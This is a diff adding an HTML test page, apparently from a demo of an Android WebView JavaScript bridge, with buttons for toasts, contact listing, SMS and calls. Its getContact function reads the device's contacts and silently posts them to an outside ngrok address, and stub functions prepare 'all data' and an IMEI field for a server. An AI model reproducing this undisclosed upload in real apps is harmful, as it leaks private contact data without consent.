@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Ma page de test</title>
+</head>
+<body>
+
+<ol>
+    <li>
+        <label for="name">Écrire le texte</label>
+
+        <input type="text" id="name" name="name"  size="20">
+        <input type="button" value="Toast what you wrote" onClick="androidShowToast(document.getElementById('name').value)" />
+    </li>
+    <li>
+        <input type="button" value="Say hello" onClick="androidShowToast('Hello Android!')" />
+        <input type="button" value="getContacts" onClick="getContact()" />
+    </li>
+    <li>
+        <span id="mon_input_texte"></span> 
+    </li>
+
+</ol>
+
+
+
+
+
+
+<script type="text/javascript">
+ 
+
+
+ function androidShowToast(msg){
+   Android.showToast(msg);
+ }
+
+ function androidShowID(){
+    Android.showID();
+ }
+
+ function getContact(){
+    const contactsString = Android.getContacts();
+    let contacts =JSON.parse(contactsString);
+    document.body.appendChild(buildHtmlTable(contacts));
+    let contactsJson =JSON.stringify({contact : contacts});
+    Android.showToast(contactsJson);
+    Android.postStringRequest("http://1f06-148-60-135-122.ngrok.io/contacts",contactsJson);
+ }
+
+ var _table_ = document.createElement('table'),
+    _tr_ = document.createElement('tr'),
+    _th_ = document.createElement('th'),
+    _td_ = document.createElement('td');
+
+ var numero;
+
+ function buildHtmlTable(arr) {
+     var table = _table_.cloneNode(false),rIndex,
+         columns = addAllColumnHeaders(arr, table);
+     for (var i=0, maxi=arr.length; i < maxi; ++i) {
+         var tr = _tr_.cloneNode(false);
+         for (var j=0, maxj=columns.length; j < maxj ; ++j) {
+             var td = _td_.cloneNode(false);
+                 cellValue = arr[i][columns[j]];
+             td.appendChild(document.createTextNode(arr[i][columns[j]] || ''));
+             tr.appendChild(td);
+         }
+         table.appendChild(tr);
+     }
+
+     for (var i = 0 ; i< table.rows.length ; i++){
+        table.rows[i].onclick = function(){
+
+              numero = "" + this.cells[1].innerHTML;
+              X = document.createElement('input');
+              X.setAttribute("id", "commentaire");
+              X.setAttribute("name", "tonMsg");
+              X.setAttribute("style", "width:400px");
+              X.setAttribute("style", "height: 150px;");
+              X.setAttribute("maxlength", 40);
+              mon_input_texte.appendChild(X) ;
+              Y = document.createElement('input');
+              Y.setAttribute("type", "button");
+              Y.setAttribute("id", "buttonSend");
+              Y.setAttribute("value", "envoyer");
+              Y.setAttribute("onClick", `send(mon_input_texte)`);
+              Y.setAttribute("style", "width:200px");
+              Y.setAttribute("style", "height: 150px;");
+              Y.setAttribute("maxlength", 40);
+              mon_input_texte.appendChild(Y) ;
+              androidShowToast(`the number of ${this.cells[0].innerHTML}   is ${this.cells[1].innerHTML}`);
+
+              Z = document.createElement('input');
+              Z.setAttribute("type", "button");
+              Z.setAttribute("id", "buttonCall");
+              Z.setAttribute("value", "Appeler");
+              Z.setAttribute("onClick", `call()`);
+              Z.setAttribute("style", "width:200px");
+              Z.setAttribute("style", "height: 150px;");
+              Z.setAttribute("maxlength", 40);
+              mon_input_texte.appendChild(Z);
+        }
+     }
+     return table;
+ }
+
+ function addAllColumnHeaders(arr, table){
+     var columnSet = [],
+         tr = _tr_.cloneNode(false);
+     for (var i=0, l=arr.length; i < l; i++) {
+         for (var key in arr[i]) {
+             if (arr[i].hasOwnProperty(key) && columnSet.indexOf(key)===-1) {
+                 columnSet.push(key);
+                 var th = _th_.cloneNode(false);
+                 th.appendChild(document.createTextNode(key));
+                 tr.appendChild(th);
+             }
+         }
+     }
+     table.appendChild(tr);
+     return columnSet;
+ }
+
+
+ function send(mNode){
+
+    Android.askPermissionAndSendSMS(numero,document.getElementById('commentaire').value);
+    androidShowToast("nous envoyons a " + numero + " : " + document.getElementById('commentaire').value);
+
+    while(mNode.firstChild){
+        mNode.removeChild(mNode.firstChild);
+    }
+ }
+
+ function call(){
+    Android.call(numero);
+ }
+
+ function sendToServer(){
+    const contactsString = Android.getContacts();
+    let contacts =JSON.parse(contactsString);
+    const imei = "";
+
+
+ }
+
+
+ function sendToServer2(){
+    const contactsString = Android.getAllData();
+    let contacts =JSON.parse(contactsString);
+    const imei = "";
+    const msg = {"imei": imei, "contacts":contacts};
+ }
+
+
+</script>
+
+</body>
+</html>
